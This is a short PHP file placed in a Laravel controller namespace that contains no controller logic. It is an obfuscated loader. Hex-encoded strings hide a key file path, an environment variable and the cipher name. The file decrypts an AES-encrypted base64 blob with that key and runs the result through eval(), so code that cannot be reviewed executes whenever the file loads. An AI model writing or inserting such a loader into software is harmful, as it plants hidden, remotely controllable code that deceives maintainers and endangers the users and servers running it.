<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('01yNJ/WZrlbLmSKspw0KVg==');

$c=base64_decode(

'IW6T/Den4dcqKu7T7Gbpve6TI72hZh0TWKm2NphpDeE/mUlXh5p3U+hKrYgIsQFoHvnWTHo/xL0C' .
'PY0lgy4Af0FSjl+F7515gujOAc/I+X1kmGf+iN1ccRFY/YrycY980rOpauTD6SgxP0ezKeWNtbdQ' .
'v98QV0ypWkOk4Z8XO6glkjbpDG1JLeTKaxEU9fC0pgsJ/4wir0Ehndaz/HBpC1tpAXMwFr71Dz/V' .
'rewcxyjqbZtg29OnxJYiSNlUGLIHrWLe86krvG3y0bvNMt2jWooFcPvDTxAUcJsAhahbc0smqjoH' .
'IitbZBRxUSACYt4InTH5aBrNco3kLtTJZGKjl3JsNVFeUkJFI1e3hiFAEIZFtJmbC/FhvD8Aa+Ye' .
'zQBGsoxlPAOL69N2Ht035XwwZQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

